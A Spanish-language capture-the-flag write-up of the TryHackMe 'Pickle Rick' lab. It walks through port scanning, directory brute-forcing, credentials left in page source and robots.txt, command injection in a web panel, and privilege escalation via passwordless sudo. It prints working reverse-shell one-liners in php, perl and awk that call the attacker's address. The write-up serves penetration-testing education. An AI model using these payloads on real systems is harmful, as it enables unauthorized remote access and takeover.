---
layout: single
title: Pickle Rick - TryHackMe
excerpt: "En este caso debemos encontrar tres banderas, que vienen a ser ingredientes, y que están ubicadas en la maquina PickleTrick. Donde realizaremos fuerza bruta de directorios de manera automatizada con wfuzz o con el script http-enum.nse de Nmap. Llegando a encontrar una aplicación web, cuyo código fuente tiene un comentario que hace referencia a un username,y un archivo escondido en el directorio raíz de la aplicación web, que contenía una password. Luego, nos autenticamos en el formulario de la aplicación web. Donde encontramos un panel que nos permite ejecutar comandos en el servidor web remoto Luego, llegamos a establecer una conexión reverse shell hacia nuestra maquina aprovechándonos de la vulnerabilidad Command Injection de la aplicación, y utilizando el archivo binario awk o perl.Luego, realizamos una escalada de privilegios mediante el archivo binario sudo. Donde llegamos a ser el usuario root."
date: 2023-05-22
classes: wide
header:
  teaser: /assets/images/PickleRick/image03.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - linux  
  - openvpn
  - nmap
  - ssh
  - http
  - wfuzz
  - burpsuite
  - php
  - python
  - perl
  - ruby
  - awk
  - sudo
---

![](/assets/images/PickleRick/Imagen01.png)
## Summary

En este caso debemos encontrar tres banderas, que vienen a ser ingredientes, y que están ubicadas en la maquina PickleTrick. Donde realizaremos fuerza bruta de directorios de manera automatizada con `wfuzz` o con el script http-enum.nse de `Nmap`. Llegando a encontrar una aplicación web, cuyo código fuente tiene un comentario que hace referencia a un username,y un archivo escondido en el directorio raíz de la aplicación web, que contenía una password. Luego, nos autenticamos en el formulario de la aplicación web. Donde encontramos un panel que nos permite ejecutar comandos en el servidor web remoto Luego, llegamos a establecer una conexión reverse shell hacia nuestra maquina aprovechándonos de la vulnerabilidad `Command Injection` de la aplicación, y utilizando el archivo binario `awk` o `perl`.Luego, realizamos una escalada de privilegios mediante el archivo binario `sudo`. Donde llegamos a ser el usuario root.

## Fase Reconocimiento

Para resolver esta maquina empezaremos utilizando el comando `openvpn` con el fin de establecer una conexión VPN con la red virtual dónde está la máquina EasyCTF. Para ello utilizaremos el archivo de configuración, que lo podemos descargar en la plataforma de Tryhackme, que puede incluir información como la dirección del servidor VPN, los certificados y claves de seguridad, la configuración de encriptación, etc.

![](/assets/images/PickleRick/image005.png)

Luego de que se establece la conexión VPN se crea una interfaz virtual de red en nuestra máquina. Donde se enruta todo el tráfico de red a través de esa interfaz.

![](/assets/images/PickleRick/image007.png)

Además, la plataforma de Tryhackme nos muestra la dirección de la máquina Pickle Rick.

![](/assets/images/PickleRick/image009.png)

## Fase Escaneo y Enumeracion

Luego pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del nodo. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el sistema operativo de la máquina Pickle Rick.
Empezaremos utilizando `Nmap`.Donde le pasaremos los siguientes parametros:
- El parametro -sC o –script=”default” para utilizar todos los scripts de la categoría default con el fin de realizar un escaneo y detección de los puertos de manera avanzada.
- Los parametros -O y -sV con el fin de conocer el sistemas operativos del nodo y las versiones de los servicios levantados.
- El parametro -n para evitar la resolución DNS, y el parametro –min-rate para indicarle el número de paquetes por segundo que va utilizar Nmap para el escaneo con el fin de evitar sobrecargar la red con el tráfico generado por Nmap.
- El parametro -p- para realizar un escaneo de los 65535 puertos del nodo y el parametro –open con el fin de que nos muestre información solo de los puertos abiertos.
- El parametro -oN para guardar el resultado del escaneo en un archivo de texto plano 

![](/assets/images/PickleRick/image011.png)

![](/assets/images/PickleRick/image013.png)

Los resultados que obtuvimos del escaneo vienen a ser:
- El título de la página web de inicio de la aplicación web que está almacenada en el servidor web de la máquina Pickle Rick.
- Que programa servidor `HTTP` se está corriendo en la máquina Pickle Rick.Además, la versión del programa servidor HTTP.
- El sistema operativo de la máquina Pickle Rick.
- Que programa servidor `SSH` se está corriendo en la máquina Pickle Rick.Además, la versión del programa servidor SSH.

Ahora ingresamos a la página de inicio de la aplicación web a través de nuestro navegador web.

![](/assets/images/PickleRick/image015.png)

Ahora observaremos el código fuente de la página web de inicio con el fin de encontrar alguna información relevante.

![](/assets/images/PickleRick/image017.png)

Observamos que hay unos comentarios en el código fuente donde se nombra el username R1ckRul3s

Ahora ejecutaremos los `scripts de nmap` de la `categoría vuln` con el fin de conocer las vulnerabilidades de los servicios que están levantados en los puertos abiertos.

![](/assets/images/PickleRick/image019.png)

![](/assets/images/PickleRick/image021.png)

![](/assets/images/PickleRick/image023.png)

Podemos notar que utilizando el script `http-enum.nse`, que realiza un fuerza bruta de directorios con una lista de nombres posibles de directorios y archivos con el fin de encontrar archivos y directorios escondidos, llegamos a obtener algunos archivos escondidos, que están almacenados en el directorio raíz de la aplicación web.

Otra manera que pudimos haber obtenido estos recursos escondidos en el servidor web seria utilizando la herramienta `wfuzz` con dos listas, que vienen incluidas por defecto en la distribucion de Kali linux.

![](/assets/images/PickleRick/image55.png)

![](/assets/images/PickleRick/image57.png)

Ahora intentaremos acceder al recurso http://10.10.134.209/robots.txt a través del navegador web.

![](/assets/images/PickleRick/image025.png)

Donde llegamos a obtener una cadena de caracteres que no tiene ningún sentido, pero que puede ser de una opción para probarlo como contraseña con el usuario encontrado anteriormente.

Ahora intentaremos acceder al recurso http://10.10.134.209/login.php a través del navegador web.

![](/assets/images/PickleRick/image027.png)

Llegamos a un formulario. Donde nos autenticamos utilizando el username, que encontramos anteriormente, y la cadena de caracteres, que encontramos anteriormente.

![](/assets/images/PickleRick/image029.png)

Llegamos a autenticarnos exitosamente. Además, tenemos un panel donde podemos ejecutar comandos de manera remota en el sistema Pickle Rick. Ejecutaremos el comando pwd a modo de prueba.

## Fase Ganar acceso o Explotacion
Ahora pondremos a prueba si la aplicacion web Pickle Rick presenta la vulnerabilidad `Command Injection`, es decir, que no valida adecuadamente todas las entradas ingresadas por el usuario, y las utiliza directamente para construir comandos que se ejecutaran el servidor web remoto. 
Ejecutaremos el comando cat /etc/passwd a modo de prueba, y con el fin de observar informacion sobre los usuarios locales del sistema Pickle Rick.

![](/assets/images/PickleRick/image59.png)

![](/assets/images/PickleRick/image61.png)

Nos damos cuenta que la aplicacion web ha filtrado nuestro comando que hemos ejecutado.

Ahora ejecutaremos un comando utilizando el archivo binario `python`, que nos genera una conexion reverse shell desde la maquina Pickle Rick hacia nuestra maquina mediante el puerto 1500, pero antes debemos verificar si existe el archivo binario en la maquina Pickle RIck para ello utilizaremos el comando which.

![](/assets/images/PickleRick/image63.png)

No nos muestra nada cuando ejecutamos el comando, por lo tanto, no tiene el archivo binario python.

Ahora intentaremos con el archivo binario `ruby`.

![](/assets/images/PickleRick/image64.png)

No nos muestra nada cuando ejecutamos el comando, por lo tanto, no tiene el archivo binario ruby.

Ahora intentaremos con el archivo binario `php`.

![](/assets/images/PickleRick/imagen65.png)

Observamos que nos muestra la ruta del archivo binario php en el sistema objetivo, por lo tanto, si tiene el archivo binario php.

Ahora habilitamos el puerto 1500 en nuestra máquina para que esté en escucha y esperando la conexión entrante. Para ello utilizamos la herramienta `netcat`.Además, utilizamos el comando `rlwrap` para que la shell generada en nuestra máquina presenta funcionalidades como el autocompletado de comandos, historial de comandos, etc.

![](/assets/images/PickleRick/image033.png)

Ahora ejecutaremos el siguiente comando, que nos generará una conexión reverse shell hacia nuestra máquina:
`php -r '$sock=fsockopen("10.8.123.194",1500);exec("sh <&3 >&3 2>&3");'`

![](/assets/images/PickleRick/image67.png)

Pero observamos que no se nos genera una shell en el sistema objetivo, como resultado de la conexion reverse shell.La primera hipótesis que podemos hacer es que la aplicación web está filtrando los comandos que utilizan el archivo php. Para verificar esta hipótesis, utilizamos `BurpSuite` para capturar la solicitud POST HTML que hacemos al servidor web, para que cargue nuestro archivo PHP. Luego enviaremos la solicitud capturada a la ventana Repeater para poder observar la respuesta HTML que recibimos del servidor web.

![](/assets/images/PickleRick/image69.png)

En el cuerpo de la respuesta HTTP del servidor, podemos observar que hay varias denegaciones con referencia a php, por lo tanto afirmamos que la aplicacion web esta filtrando los comandos que utilizan el archivo binario php.  

Ahora verificaremos si existe el archivo binario `perl` en el sistema objetivo, con el comando which.

![](/assets/images/PickleRick/image035.png)

bservamos que nos muestra la ruta del archivo binario php en el sistema objetivo, por lo tanto, si tiene el archivo binario perl.

Ahora ejecutaremos el siguiente comando,que nos generará una conexión reverse shell hacia nuestra máquina:
`perl -e 'use Socket;$i="10.8.123.194";$p=1500;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

![](/assets/images/PickleRick/image037.png)

![](/assets/images/PickleRick/image039.png)

De esta manera llegamos a obtener acceso a la máquina Pickle Rick. 

Otra manera de obtener acceso seria verificando si existe el archivo binario `awk` en el sistema objetivo.Luego, ejecutariamos el sgte comando para generar la conexion reverse shell: `awk 'BEGIN {s = "/inet/tcp/0/10.8.123.194/1500"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`

![](/assets/images/PickleRick/image71.png)

![](/assets/images/PickleRick/image73.png)

![](/assets/images/PickleRick/image75.png)

Luego, al listar el directorio raíz de la aplicación web encontramos el primer ingrediente solicitado dentro del archivo Sup3rS3cretPickl3Ingred.txt.

![](/assets/images/PickleRick/image041.png)

Además, observamos un archivo que se llama pista.txt(or clue.txt) cuyo contenido nos indica que sigamos buscando en el sistema de archivo para encontrar los demás ingredientes.

![](/assets/images/PickleRick/image043.png)

Después, nos dirigimos al directorio home.Donde encontramos dos directorios con el nombre de dos usuarios. Cuando listamos los archivos del directorio rick llegamos a obtener un archivo llamado second ingredients, que contiene el segundo ingrediente.

![](/assets/images/PickleRick/image045.png)

Lo más probable es que el tercer ingrediente esté en el directorio del usuario root. Por lo tanto, debemos buscar una forma de escalar privilegios.

## Fase Escalada de Privilegios
Ahora analizaremos si existe el archivo binario `sudo`, para ello utilizamos el comando which.

![](/assets/images/PickleRick/image047.png)

Ahora que ya hemos verificado que existe el archivo sudo. Utilizaremos la bandera -l con el fin de listar los comandos que puede ejecutar el usuario actual con los privilegios del superusuario.

![](/assets/images/PickleRick/image049.png)

El resultado de este comando nos indica que el usuario www-data puede ejecutar cualquier comando, utilizando el archivo binario sudo, con los privilegios del superusuario o root.Adenas, no se solicitará la contraseña del usuario www-data cada vez.

Aprovechando esto. Utilizaremos el comando su para cambiarnos al usuario root

![](/assets/images/PickleRick/image051.png)

Después, nos dirigimos al directorio root. Donde listamos los directorios y archivos que contiene. 

![](/assets/images/PickleRick/image053.png)

De esta manera llegamos a encontrar el tercer ingrediente.
